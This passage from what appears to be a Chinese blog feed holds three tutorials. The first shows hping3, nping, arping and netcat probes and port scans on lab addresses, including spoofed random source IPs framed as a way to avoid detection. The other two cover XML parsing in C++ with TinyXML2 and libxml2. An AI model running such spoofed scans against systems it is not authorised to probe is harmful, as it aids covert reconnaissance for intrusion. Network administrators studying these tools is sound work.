可以通过一下选项指定发送数据包的协议 选项 选项全称 描述 -0 –rawip 发送原始IP数据包 -1 –icmp 发送ICMP数据包 -2 –udp 发送UDP数据包 -8 –scan 扫描模式 -9 –listen 监听模式 注意，默认是发送TCP数据包 选项 描述 -S SYN -F FIN -R RST -P PUSH -A ACK -U URG -X XMAS -Y YMAS 发送TCP数据包123456789101112&gt; hping3 -I eth0 -V --syn 192.168.1.110 -c 2using eth0, addr: 192.168.1.108, MTU: 1500HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data byteslen=46 ip=192.168.1.110 ttl=64 DF id=10106 tos=0 iplen=40sport=0 flags=RA seq=0 win=0 rtt=7.7 msseq=0 ack=1839333390 sum=88b4 urp=0len=46 ip=192.168.1.110 ttl=64 DF id=10157 tos=0 iplen=40sport=0 flags=RA seq=1 win=0 rtt=7.6 msseq=0 ack=439379179 sum=1ca3 urp=0--- 192.168.1.110 hping statistic ---2 packets transmitted, 2 packets received, 0% packet lossround-trip min/avg/max = 7.6/7.7/7.7 ms 端口检测-p 指定目的端口 1234567&gt; hping3 -I eth0 -S -p 3306 192.168.1.110 -c 2HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data byteslen=46 ip=192.168.1.110 ttl=64 DF id=0 sport=3306 flags=SA seq=0 win=29200 rtt=31.8 mslen=46 ip=192.168.1.110 ttl=64 DF id=0 sport=3306 flags=SA seq=1 win=29200 rtt=7.7 ms--- 192.168.1.110 hping statistic ---2 packets transmitted, 2 packets received, 0% packet lossround-trip min/avg/max = 7.7/19.7/31.8 ms 注意其中的 win=29200 表示开放该端口 Scan模式通过 -8/–scan 来开启扫描模式。所谓扫描模式，通过一个端口组，对主机进行端口扫描。hping3 给出了两个关键字代表多个端口。 关键字 描述 all 表示 0-65535 的端口 known 表示已知本地端口，这些端口位于/etc/services文件 例1，扫描 0-65535 的端口 123456789101112&gt; hping3 --scan &apos;all&apos; -S 192.168.1.110Scanning 192.168.1.110 (192.168.1.110), port all65536 ports to scan, use -V to see all the replies+----+-----------+---------+---+-----+-----+-----+|port| serv name | flags |ttl| id | win | len |+----+-----------+---------+---+-----+-----+-----+ 3306 mysql : .S..A... 64 0 29200 46 80 http : .S..A... 64 0 29200 46All replies received. Done.Not responding ports: (1 tcpmux) (2 nbp) (3 ) (4 echo) (6 zip) (8 ) (9 discard) (10 ) (11 systat) (13 daytime) (14 ) ............ 例2，扫描 1-5555的端口和已知端口 123456789101112131415161718192021222324252627282930&gt; hping3 -8 &apos;1-5555,known&apos; -S 192.168.1.17Scanning 192.168.1.17 (192.168.1.17), port 1-5555,known5641 ports to scan, use -V to see all the replies+----+-----------+---------+---+-----+-----+-----+|port| serv name | flags |ttl| id | win | len |+----+-----------+---------+---+-----+-----+-----+ 21 ftp : .S..A... 64 0 5840 44 22 ssh : .S..A... 64 0 5840 44 23 telnet : .S..A... 64 0 5840 44 25 smtp : .S..A... 64 0 5840 44 53 domain : .S..A... 64 0 5840 44 80 http : .S..A... 64 0 5840 44 111 sunrpc : .S..A... 64 0 5840 44 139 netbios-ssn: .S..A... 64 0 5840 44 445 microsoft-d: .S..A... 64 0 5840 44 512 exec : .S..A... 64 0 5840 44 513 login : .S..A... 64 0 5840 44 514 shell : .S..A... 64 0 5840 44 1099 rmiregistry: .S..A... 64 0 5840 44 1524 ingreslock : .S..A... 64 0 5840 44 2049 nfs : .S..A... 64 0 5840 44 2121 iprop : .S..A... 64 0 5840 44 3306 mysql : .S..A... 64 0 5840 44 3632 distcc : .S..A... 64 0 5840 44 5432 postgresql : .S..A... 64 0 5840 44 6000 x11 : .S..A... 64 0 5840 44 6667 ircd : .S..A... 64 0 5840 44 6697 ircs-u : .S..A... 64 0 5840 44All replies received. Done.Not responding ports: 发送随机原IP地址的数据包–rand-source/–rand-dest 用于伪造原/目的IP地址，这可以在很大程度上不让我们自己的IP地址被对方检测到 12345678910111213&gt; hping3 --udp -S 192.168.1.17 -c 5 --rand-sourceHPING 192.168.1.17 (eth0 192.168.1.17): udp mode set, 28 headers + 0 data bytesICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17status=0 port=2475 seq=0ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17status=0 port=2476 seq=1ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17status=0 port=2477 seq=2ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17status=0 port=2478 seq=3--- 192.168.1.17 hping statistic ---5 packets transmitted, 4 packets received, 20% packet lossround-trip min/avg/max = 3.5/4.1/5.8 ms 然而这个的问题是丢包率增大。 可以在目主机上执行 tcpdump -nn -v -t udp 来查看收发包情况。 npingnping是 Nmap 的一个 网络数据包生成工具。支持 TCP、UDP、ICMP、ARP 协议，多个主机的多个端口。功能类似与hping3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116Nping 0.7.60 ( https://nmap.org/nping )Usage: nping [Probe mode] [Options] &#123;target specification&#125;TARGET SPECIFICATION: Targets may be specified as hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.*.1-24PROBE MODES: --tcp-connect : Unprivileged TCP connect probe mode. --tcp : TCP probe mode. --udp : UDP probe mode. --icmp : ICMP probe mode. --arp : ARP/RARP probe mode. --tr, --traceroute : Traceroute mode (can only be used with TCP/UDP/ICMP modes).TCP CONNECT MODE: -p, --dest-port &lt;port spec&gt; : Set destination port(s). -g, --source-port &lt;portnumber&gt; : Try to use a custom source port.TCP PROBE MODE: -g, --source-port &lt;portnumber&gt; : Set source port. -p, --dest-port &lt;port spec&gt; : Set destination port(s). --seq &lt;seqnumber&gt; : Set sequence number. --flags &lt;flag list&gt; : Set TCP flags (ACK,PSH,RST,SYN,FIN...) --ack &lt;acknumber&gt; : Set ACK number. --win &lt;size&gt; : Set window size. --badsum : Use a random invalid checksum. UDP PROBE MODE: -g, --source-port &lt;portnumber&gt; : Set source port. -p, --dest-port &lt;port spec&gt; : Set destination port(s). --badsum : Use a random invalid checksum. ICMP PROBE MODE: --icmp-type &lt;type&gt; : ICMP type. --icmp-code &lt;code&gt; : ICMP code. --icmp-id &lt;id&gt; : Set identifier. --icmp-seq &lt;n&gt; : Set sequence number. --icmp-redirect-addr &lt;addr&gt; : Set redirect address. --icmp-param-pointer &lt;pnt&gt; : Set parameter problem pointer. --icmp-advert-lifetime &lt;time&gt; : Set router advertisement lifetime. --icmp-advert-entry &lt;IP,pref&gt; : Add router advertisement entry. --icmp-orig-time &lt;timestamp&gt; : Set originate timestamp. --icmp-recv-time &lt;timestamp&gt; : Set receive timestamp. --icmp-trans-time &lt;timestamp&gt; : Set transmit timestamp.ARP/RARP PROBE MODE: --arp-type &lt;type&gt; : Type: ARP, ARP-reply, RARP, RARP-reply. --arp-sender-mac &lt;mac&gt; : Set sender MAC address. --arp-sender-ip &lt;addr&gt; : Set sender IP address. --arp-target-mac &lt;mac&gt; : Set target MAC address. --arp-target-ip &lt;addr&gt; : Set target IP address.IPv4 OPTIONS: -S, --source-ip : Set source IP address. --dest-ip &lt;addr&gt; : Set destination IP address (used as an alternative to &#123;target specification&#125; ). --tos &lt;tos&gt; : Set type of service field (8bits). --id &lt;id&gt; : Set identification field (16 bits). --df : Set Don&apos;t Fragment flag. --mf : Set More Fragments flag. --ttl &lt;hops&gt; : Set time to live [0-255]. --badsum-ip : Use a random invalid checksum. --ip-options &lt;S|R [route]|L [route]|T|U ...&gt; : Set IP options --ip-options &lt;hex string&gt; : Set IP options --mtu &lt;size&gt; : Set MTU. Packets get fragmented if MTU is small enough.IPv6 OPTIONS: -6, --IPv6 : Use IP version 6. --dest-ip : Set destination IP address (used as an alternative to &#123;target specification&#125;). --hop-limit : Set hop limit (same as IPv4 TTL). --traffic-class &lt;class&gt; : : Set traffic class. --flow &lt;label&gt; : Set flow label.ETHERNET OPTIONS: --dest-mac &lt;mac&gt; : Set destination mac address. (Disables ARP resolution) --source-mac &lt;mac&gt; : Set source MAC address. --ether-type &lt;type&gt; : Set EtherType value.PAYLOAD OPTIONS: --data &lt;hex string&gt; : Include a custom payload. --data-string &lt;text&gt; : Include a custom ASCII text. --data-length &lt;len&gt; : Include len random bytes as payload.ECHO CLIENT/SERVER: --echo-client &lt;passphrase&gt; : Run Nping in client mode. --echo-server &lt;passphrase&gt; : Run Nping in server mode. --echo-port &lt;port&gt; : Use custom &lt;port&gt; to listen or connect. --no-crypto : Disable encryption and authentication. --once : Stop the server after one connection. --safe-payloads : Erase application data in echoed packets.TIMING AND PERFORMANCE: Options which take &lt;time&gt; are in seconds, or append &apos;ms&apos; (milliseconds), &apos;s&apos; (seconds), &apos;m&apos; (minutes), or &apos;h&apos; (hours) to the value (e.g. 30m, 0.25h). --delay &lt;time&gt; : Adjust delay between probes. --rate &lt;rate&gt; : Send num packets per second.MISC: -h, --help : Display help information. -V, --version : Display current version number. -c, --count &lt;n&gt; : Stop after &lt;n&gt; rounds. -e, --interface &lt;name&gt; : Use supplied network interface. -H, --hide-sent : Do not display sent packets. -N, --no-capture : Do not try to capture replies. --privileged : Assume user is fully privileged. --unprivileged : Assume user lacks raw socket privileges. --send-eth : Send packets at the raw Ethernet layer. --send-ip : Send packets using raw IP sockets. --bpf-filter &lt;filter spec&gt; : Specify custom BPF filter.OUTPUT: -v : Increment verbosity level by one. -v[level] : Set verbosity level. E.g: -v4 -d : Increment debugging level by one. -d[level] : Set debugging level. E.g: -d3 -q : Decrease verbosity level by one. -q[N] : Decrease verbosity level N times --quiet : Set verbosity and debug level to minimum. --debug : Set verbosity and debug to the max level.EXAMPLES: nping scanme.nmap.org nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1 nping --icmp --icmp-type time --delay 500ms 192.168.254.254 nping --echo-server &quot;public&quot; -e wlan0 -vvv nping --echo-client &quot;public&quot; echo.nmap.org --tcp -p1-1024 --flags ackSEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES TCP扫描1234567891011121314151617&gt; nping --tcp -c 1 192.168.1.110 192.168.1.108 -p 22,3306 --flags=synStarting Nping 0.7.60 ( https://nmap.org/nping ) at 2018-04-05 11:08 CSTSENT (0.0428s) TCP 192.168.1.108:39046 &gt; 192.168.1.110:22 S ttl=64 id=19287 iplen=40 seq=1799430370 win=1480 RCVD (0.0465s) TCP 192.168.1.110:22 &gt; 192.168.1.108:39046 SA ttl=64 id=0 iplen=44 seq=2225990095 win=29200 &lt;mss 1460&gt;SENT (1.0437s) TCP 192.168.1.108:39046 &gt; 192.168.1.108:22 S ttl=64 id=19287 iplen=40 seq=1799430370 win=1480 SENT (2.0449s) TCP 192.168.1.108:39046 &gt; 192.168.1.110:3306 S ttl=64 id=19287 iplen=40 seq=1799430370 win=1480 RCVD (2.0897s) TCP 192.168.1.110:3306 &gt; 192.168.1.108:39046 SA ttl=64 id=0 iplen=44 seq=3017639874 win=29200 &lt;mss 1460&gt;SENT (3.0468s) TCP 192.168.1.108:39046 &gt; 192.168.1.108:3306 S ttl=64 id=19287 iplen=40 seq=1799430370 win=1480 Statistics for host 192.168.1.110: | Probes Sent: 2 | Rcvd: 2 | Lost: 0 (0.00%) |_ Max rtt: 44.817ms | Min rtt: 3.653ms | Avg rtt: 24.235msStatistics for host 192.168.1.108: | Probes Sent: 2 | Rcvd: 0 | Lost: 2 (100.00%) |_ Max rtt: N/A | Min rtt: N/A | Avg rtt: N/ARaw packets sent: 4 (160B) | Rcvd: 2 (92B) | Lost: 2 (50.00%)Nping done: 2 IP addresses pinged in 4.09 seconds arpingarping用在本地局域网中，判断目标主机是否在线 12345678910111213Usage: arping [-fqbDUAV] [-c count] [-w timeout] [-I device] [-s source] destination -f : quit on first reply -q : be quiet -b : keep broadcasting, don&apos;t go unicast -D : duplicate address detection mode -U : Unsolicited ARP mode, update your neighbours -A : ARP answer mode, update your neighbours -V : print version and exit -c count : how many packets to send -w timeout : how long to wait for a reply -I device : which ethernet device to use -s source : source ip address destination : ask for what ip address 如下判断 192.168.1.110 主机是否在线 123456&gt; arping -c 2 192.168.1.110 -w 1ARPING 192.168.1.110 from 192.168.1.108 eth0Unicast reply from 192.168.1.110 [24:05:0F:41:E3:87] 61.513msUnicast reply from 192.168.1.110 [24:05:0F:41:E3:87] 1.864msSent 2 probes (1 broadcast(s))Received 2 response(s) netcat对于netcat(nc)，我只想介绍其中一个功能——扫描主机端口 1234&gt; nc -zvn -w 1 192.168.1.110 1-5555(UNKNOWN) [192.168.1.110] 3306 (mysql) open(UNKNOWN) [192.168.1.110] 80 (http) open(UNKNOWN) [192.168.1.110] 22 (ssh) open 结尾以上是一些比较常用ping工具了，当然还有更强的的如nmap :) bye]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TinyXML2解析XML文件]]></title>
    <url>%2Flinux-tinyxml2%2F</url>
    <content type="text"><![CDATA[上次介绍了用 libxml2 解析XML文档，用起来也挺“痛苦”的，不过这次即将介绍的同为开源 tinyxml2 可再简单不够了。。。 TinyXML2TinyXML2是什么？ TinyXML-2 is a simple, small, efficient, C++ XML parser that can be easily integrated into other programs. 与 面向过程 的libxml2相比，TinyXML2是 面向对象 的，所有的操作都被封装在 类 里面，因此变得极其简单。而且 tinyxml2 实现的代码文件为 tinyxml2.h tinyxml2.cpp，而 tinyxml2.cpp 仅大约2800行代码实现了xml解析，实在令人佩服。 Simply compile and run. There is a visual studio 2015 project included, a simple Makefile, an Xcode project, a Code::Blocks project, and a cmake CMakeLists.txt included to help you. 可从Github上获取其源文件： https://github.com/leethomason/tinyxml2 tinyxml2主要包括了一下几个类 Class Class XMLAttribute XMLComment XMLConstHandle XMLDeclaration XMLDocument XMLElement XMLHandle XMLNode XMLPrinter XMLText XMLUnknown XMLVisitor 顾名思义，这些类的功能直接从名字就知道了。其中 XMLNode 为大多数类的基类，即一个节点对象。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 也是一个节点注释（Comment）也是一个节点对象，但属性（Attribute）却不是，因为它没有从 XMLNode类 派生出来 要解析一个XML文档，一般可通过 XMLDocument 加载XML文档 12XMLError tinyxml2::XMLDocument::LoadFile(const char * filename) XMLError tinyxml2::XMLDocument::LoadFile(FILE * ) 相反，tinyxml2::XMLDocument::SaveFile 可保存XML文档 下面的例子以解析XML文档所以节点信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;tinyxml2.h&gt;using namespace std;using namespace tinyxml2; void ParserXMLFile(int &amp;depth,XMLNode *pNode)&#123; int index=0; // 根节点 XMLNode *node=pNode; do&#123; // 如果是节点是元素 if(node-&gt;ToElement())&#123; index++; XMLElement *element=node-&gt;ToElement(); cout.width(depth); cout&lt;&lt;index&lt;&lt;"."&lt;&lt;element-&gt;Name(); // 获取元素的文本 if(element-&gt;GetText())&#123; cout&lt;&lt;"--&gt;"&lt;&lt;element-&gt;GetText(); &#125; cout&lt;&lt;endl; // 解析属性 const XMLAttribute *attribute=element-&gt;FirstAttribute(); bool ishas_attr=false; if(attribute) &#123; ishas_attr=true; cout.width(depth); cout&lt;&lt;"=&gt; "; while (attribute)&#123; cout&lt;&lt;attribute-&gt;Name()&lt;&lt;":"&lt;&lt;attribute-&gt;Value()&lt;&lt;" | "; attribute=attribute-&gt;Next(); &#125; if(ishas_attr)cout&lt;&lt;endl; &#125; // 当前节点node的下一个子节点 if(node-&gt;FirstChild())&#123; depth+=10; ParserXMLFile(depth,node-&gt;FirstChild()); &#125; &#125; node=node-&gt;NextSibling(); &#125;while(node); if(depth&gt;0)&#123; depth-=10; &#125;&#125;void testParserXML()&#123; XMLDocument document; XMLError xmlError; if((xmlError= document.LoadFile("test1.xml"))==XML_SUCCESS)&#123; cout&lt;&lt;"Load xml file ok!"&lt;&lt;endl; &#125;else&#123; cout&lt;&lt;document.ErrorStr()&lt;&lt;endl; exit(-1); &#125; // &lt;?xml version="1.0" encoding="UTF-8"?&gt; if(document.FirstChild()-&gt;ToDeclaration())&#123; cout&lt;&lt;document.FirstChild()-&gt;ToDeclaration()-&gt;Value()&lt;&lt;endl; &#125; // &lt;!--This is a comment...--&gt; if(document.FirstChild()-&gt;NextSibling()-&gt;ToComment())&#123; cout&lt;&lt;document.FirstChild()-&gt;NextSibling()-&gt;ToComment()-&gt;Value()&lt;&lt;endl; &#125; cout&lt;&lt;"Root Element: "&lt;&lt; document.RootElement()-&gt;Name()&lt;&lt;endl; int depth=0; // 根节点下的第一个子节点 ParserXMLFile(depth,document.RootElement()-&gt;FirstChild());&#125;int main(int argc,char **argv) &#123; testParserXML(); return 0;&#125; 上面的代码是不是很熟悉？ test.xml 12345678910111213141516171819&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!--This is a comment...--&gt;&lt;Theme version="2.0" magnet="9" alpha="255"&gt; &lt;Bitmap id="main" file="main.bmp" alphacolor="#FF0001" /&gt; &lt;Font id="playlist_font" file="FreeSansBold.ttf" size="11" /&gt; &lt;BitmapFont id="digits_font" file="nums_ex.bmp" type="digits" /&gt; &lt;Window id="playlist_window" x="100" y="332"&gt; &lt;Layout id="pl_small_layout" width="275" height="116" minwidth="275" minheight="116" maxwidth="1000" maxheight="800"&gt; &lt;Group&gt; &lt;Text font="text_font" x="4" y="4" width="239" text="$N" /&gt; &lt;/Group&gt; &lt;/Layout&gt; &lt;Layout id="pl_big_layout" width="275" height="116" minwidth="275" minheight="116" maxwidth="1000" maxheight="800"&gt; &lt;Group x="0" y="0"&gt; &lt;Anchor x="0" y="116" priority="30" range="15" /&gt; &lt;/Group&gt; &lt;/Layout&gt; &lt;/Window&gt;&lt;/Theme&gt; 最后的结果就不显示出来了。。。思路也很简单，通过递归获取每个子节点的信息。官网也有类文档可参考，这里就不在详细介绍了。不过有个地方的确要注意 const char* tinyxml2::XMLNode::Value()const 12345Document: empty (NULL is returned,not an empty string)Element: name of the elementComment: the comment textUnknown: the tag contentsText: the text string 这是基类XMLNode的Value成员函数，而文档（Document）对象，返回确实一个 NULL，不是空字符串！文档对象是一个特殊的节点对象。 而生成XML则时更加简单了 123456789101112131415161718192021222324252627void GenerateXMLFile(const char *filename)&#123; XMLDocument document; // 添加 &lt;?xml version="1.0" encoding="UTF-8"?&gt; document.InsertFirstChild(document.NewDeclaration()); // 添加注释 document.InsertEndChild(document.NewComment("Hello World!")); // 添加根节点 XMLElement *root= document.NewElement("People"); document.InsertEndChild(root); // 添加一个新元素 XMLElement *student=document.NewElement("Student"); // 设置元素属性 student-&gt;SetAttribute("name","XiaoMing"); student-&gt;SetAttribute("age",16); XMLElement *stu_0=document.NewElement("Hobby"); stu_0-&gt;SetText("Play Football"); // 插入子节点 student-&gt;InsertFirstChild(stu_0); XMLElement *teacher=document.NewElement("Teacher"); teacher-&gt;SetText("I am a teacher"); // 删除属性 student-&gt;DeleteAttribute("age"); root-&gt;InsertFirstChild(student); root-&gt;InsertEndChild(teacher); // 保存文件 document.SaveFile(filename);&#125; 要打印XML文档的内容到标准输出，可以用 XMLPrinter 类，其构造函数为 1234567/** Construct the printer. If the FILE* is specified, this will print to the FILE. Else it will print to memory, and the result is available in CStr(). If 'compact' is set to true, then output is created with only required whitespace and newlines. */ XMLPrinter( FILE* file=0, bool compact = false, int depth = 0 ); 调用如下 123XMLPrinter printer;document.Print( &amp;printer );cout&lt;&lt;printer.CStr()&lt;&lt;endl; 关于 XMLHandle 的作用，官网也说得很清楚，假如有一下xml 123456&lt;Document&gt; &lt;Element attributeA = "valueA"&gt; &lt;Child attributeB = "value1" /&gt; &lt;Child attributeB = "value2" /&gt; &lt;/Element&gt;&lt;/Document&gt; 如果要获取 attributeB 属性的值 “value2”，一般情况下，通过如下方法获取最终的值 12345678910111213XMLElement* root = document.FirstChildElement( "Document" );if ( root )&#123; XMLElement* element = root-&gt;FirstChildElement( "Element" ); if ( element ) &#123; XMLElement* child = element-&gt;FirstChildElement( "Child" ); if ( child ) &#123; XMLElement* child2 = child-&gt;NextSiblingElement( "Child" ); if ( child2 ) &#123; // Finally do something useful. 每一步都必须判断是否为空指针，这样的话代码就显得十分繁琐，于是 XMLHandle 提供了这样一种方法 12345XMLHandle docHandle( &amp;document );XMLElement* child2 = docHandle.FirstChildElement( "Document" ).FirstChildElement( "Element" ).FirstChildElement().NextSiblingElement();if ( child2 )&#123; // do something useful 这样的话，就不用每步都进行一次判断了。如果在这中间过程中返回了空指针，那么结果就是空指针，只有每一步都正确，结果才正确。 思考以下代码，看看那个代码写法正确？ 123if(document.FirstChildElement("notPeople")-&gt;FirstChildElement("Student"))&#123; cout&lt;&lt;document.FirstChildElement("People")-&gt;FirstChildElement("Student")-&gt;Value()&lt;&lt;endl;&#125; 1234XMLHandle handle(&amp;document); if(handle.FirstChildElement("notPeople").FirstChildElement("Student").ToElement())&#123; cout&lt;&lt;document.FirstChildElement("People")-&gt;FirstChildElement("Student")-&gt;Value()&lt;&lt;endl;&#125; Bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Libxml2解析XML文件]]></title>
    <url>%2Flinux-libxml2%2F</url>
    <content type="text"><![CDATA[Libxml2是由C语言开发的一个库，除了解析XML文档外，还可以解析HTML文档（不过这我没有研究）。同时，libxml2库可移植于多个平台大致可与运行在如下平台： Linux, Unix, Windows, CygWin, MacOS, MacOS X, RISC Os, OS/2, VMS, QNX, MVS, VxWorks 可以从官网： http://xmlsoft.org 获取最新版本（2.9.8）的libxml2库。Linux下编译也很简单./configuremakemake install 官网上也有一些例子，以及API接口文档，常见问题，Tutorial，建议去看看。也可以从下载的源文件目录doc中离线浏览 libxml2库囊括了以下的模块， Table of ContentsDOCBparser: old DocBook SGML parserHTMLparser: interface for an HTML 4.0 non-verifying parserHTMLtree: specific APIs to process HTML tree, especially serializationSAX: Old SAX version 1 handler, deprecatedSAX2: SAX2 parser interface used to build the DOM treec14n: Provide Canonical XML and Exclusive XML Canonicalizationcatalog: interfaces to the Catalog handling systemchvalid: Unicode character range checkingdebugXML: Tree debugging APIsdict: string dictionaryencoding: interface for the encoding conversion functionsentities: interface for the XML entities handlingglobals: interface for all global variables of the libraryhash: Chained hash tableslist: lists interfacesnanoftp: minimal FTP implementationnanohttp: minimal HTTP implementationparser: the core parser moduleparserInternals: internals routines and limits exported by the parser.pattern: pattern expression handlingrelaxng: implementation of the Relax-NG validationschemasInternals: internal interfaces for XML Schemasschematron: XML Schemastron implementationthreads: interfaces for thread handlingtree: interfaces for tree manipulationuri: library of generic URI related routinesvalid: The DTD validationxinclude: implementation of XIncludexlink: unfinished XLink detection modulexmlIO: interface for the I/O interfaces used by the parserxmlautomata: API to build regexp automataxmlerror: error handlingxmlexports: macros for marking symbols as exportable/importable.xmlmemory: interface for the memory allocatorxmlmodule: dynamic module loadingxmlreader: the XMLReader implementationxmlregexp: regular expressions handlingxmlsave: the XML document serializerxmlschemas: incomplete XML Schemas structure implementationxmlschemastypes: implementation of XML Schema Datatypesxmlstring: set of routines to process stringsxmlunicode: Unicode character APIsxmlversion: compile-time version informationsxmlwriter: text writing API for XMLxpath: XML Path Language implementationxpathInternals: internal interfaces for XML Path Language implementationxpointer: API to handle XML Pointers 因为libxml2包含大量函数，实现有不同的方式。这里介绍一些常用的。至于其他的功能有兴趣自己研究吧……而这里主要用到的为 parser，tree，xmlreader，xmlwriter 这几个模块 parser/tree读取XML文档首先介绍xml文档的解析吧，大致调用函数如下 xmlReadFile/xmlParseFile 打开一个XML文档并返回一个文档对象指针xmlDocPtr xmlDocGetRootElement 获取XML文档的根节点xmlNodePtr 获取根节点，以及childNode的名称、属性名/值。而这一步骤可以通过递归实现。 最后由 xmlFreeDoc、xmlCleanupParser 释放所有分配的内存 下面给出一个例子（C++） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;libxml/parser.h&gt;#include &lt;libxml/tree.h&gt;using namespace std;////// \param depth 递归深度/// \param _xmlNodePtr 节点对象指针void ParserXML(int &amp;depth,xmlNodePtr _xmlNodePtr)&#123; bool ishas_child=false; // 所有子节点 xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children; int count=0; while (xmlNodePtr1)&#123; // 判断节点类型 if(xmlNodePtr1-&gt;type!=XML_TEXT_NODE)&#123; // xmlStrcmp(xmlNodePtr1-&gt;name,BAD_CAST "text") count++; // 子节点个数 int childEleCount= xmlChildElementCount(xmlNodePtr1); cout.width(depth); if(childEleCount==0)&#123; ishas_child=false; // 表明无子节点 cout&lt;&lt;count&lt;&lt;"."&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;" --&gt; "&lt;&lt;xmlNodeGetContent(xmlNodePtr1)&lt;&lt;endl; &#125;else&#123; ishas_child=true; // 表明有子节点 cout&lt;&lt;count&lt;&lt;"."&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;endl; &#125; // 遍历节点属性 xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties; if(xmlAttr1)&#123; cout.width(depth+1); cout&lt;&lt;"=&gt;"; while (xmlAttr1!=NULL)&#123; // 判断使用存在属性 ， xmlGetProp获取属性值 if(xmlHasProp(xmlNodePtr1,xmlAttr1-&gt;name))&#123; cout&lt;&lt;" "&lt;&lt;xmlAttr1-&gt;name&lt;&lt;":"&lt;&lt; xmlGetProp(xmlNodePtr1,xmlAttr1-&gt;name); &#125; xmlAttr1=xmlAttr1-&gt;next; &#125; cout&lt;&lt;endl; &#125; // 递归调用 if(ishas_child)&#123; depth+=10; ParserXML(depth,xmlNodePtr1); &#125; &#125; xmlNodePtr1=xmlNodePtr1-&gt;next; &#125; if(depth&gt;0)&#123; depth-=10; &#125;&#125;int main(int argc,char** argv) &#123; if(argc!=2) return 0; xmlDocPtr xmlDocPtr1=NULL; //xmlDocPtr1=xmlParseFile(argv[1]); xmlInitParser(); // 读取文件 xmlDocPtr1=xmlReadFile(argv[1],"UTF-8",0); if(xmlDocPtr1==NULL) &#123; xmlErrorPtr xmlErrorPtr1 =xmlGetLastError(); cout &lt;&lt; xmlErrorPtr1-&gt;message &lt;&lt; endl; exit(-1); &#125; cout&lt;&lt;"Version: "&lt;&lt;xmlDocPtr1-&gt;version&lt;&lt;endl; cout&lt;&lt;"Encoding: "&lt;&lt;xmlDocPtr1-&gt;encoding&lt;&lt;endl; // 获取根节点 xmlNodePtr xmlNodePtr1= xmlDocGetRootElement(xmlDocPtr1); cout&lt;&lt;"Root Element: "&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;endl&lt;&lt;endl; // 遍历所有信息 int depth=0; ParserXML(depth,xmlNodePtr1); // 释放内存 xmlFreeDoc(xmlDocPtr1); xmlCleanupParser(); return 0;&#125; 有如下 test.xml 文档 123456789101112131415161718192021&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;People&gt; &lt;Student id="0x00000000"&gt; &lt;name&gt;Jack&lt;/name&gt; &lt;age&gt;14&lt;/age&gt; &lt;sex&gt;Man&lt;/sex&gt; &lt;hobby&gt;Computer Programming&lt;/hobby&gt; &lt;/Student&gt; &lt;Student id="0x11111111"&gt; &lt;name&gt;Tony&lt;/name&gt; &lt;age&gt;17&lt;/age&gt; &lt;sex&gt;Man&lt;/sex&gt; &lt;hobby&gt;Play Basketball&lt;/hobby&gt; &lt;/Student&gt; &lt;Student id="0x22222222"&gt; &lt;name&gt;Job&lt;/name&gt; &lt;age&gt;20&lt;/age&gt; &lt;sex&gt;Man&lt;/sex&gt; &lt;hobby&gt;Play Football&lt;/hobby&gt; &lt;/Student&gt;&lt;/People&gt; 编译运行 g++ main.cpp -o main xml2-config –libs –cflags&amp;&amp; ./main test.xml 输出信息 123456789101112131415161718192021Version: 1.0Encoding: UTF-8ROOT Element: People1.Student=&gt; id:0x00000000 1.name --&gt; Jack 2.age --&gt; 14 3.sex --&gt; Man 4.hobby --&gt; Computer Programming2.Student=&gt; id:0x11111111 1.name --&gt; Tony 2.age --&gt; 17 3.sex --&gt; Man 4.hobby --&gt; Play Basketball3.Student=&gt; id:0x22222222 1.name --&gt; Job 2.age --&gt; 20 3.sex --&gt; Man 4.hobby --&gt; Play Football 可以看到，成功的解析xml文档并格式化的输出信息。这个例子的核心代码就是那个递归函数。现在我们来看看它到底干了些什么。不过在此之前，先谈谈 xmlParseFile 和 xmlReadFile 的区别。它们都是打开一个XML文档并返回一个文档对象指针 xmlDocPtr ，不同之处就在于它们提供的参数不同 12xmlDocPtr xmlParseFile(const char *filename);xmlDocPtr xmlReadFile(const char *URL,**const char *encoding**,int options); xmlReadFile 以指定的编码格式打开xml文档，而 xmlParseFile 默认以UTF-8编码格式打开文档。比如，刚才的test.xml 中通过encoding指定了UTF-8编码格式，那么用 xmlParseFile 能成功解析，用 xmlReadFile 函数无论const char *encoding 参数为NULL还是“UTF-8” 也能成功解析。但是 test.xml 只有 那么 xmlParseFile 会解析失败，而 xmlReadFile 只有 第二个参数为 “UTF-8”时才能解析成功。 好了，继续看那个递归函数吧。。。首先用 xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children; 获取的 _xmlNodePtr 节点的所有子节点，然后在while循环中判断每个子节点的类型，xmlNodePtr1-&gt;type!=XML_TEXT_NODE 如果不是 XML_TEXT_NODE 那就继续。接着 用 xmlChildElementCount 获取 xmlNodePtr1 节点指针的所有子节点个数，并用一个 ishas_child 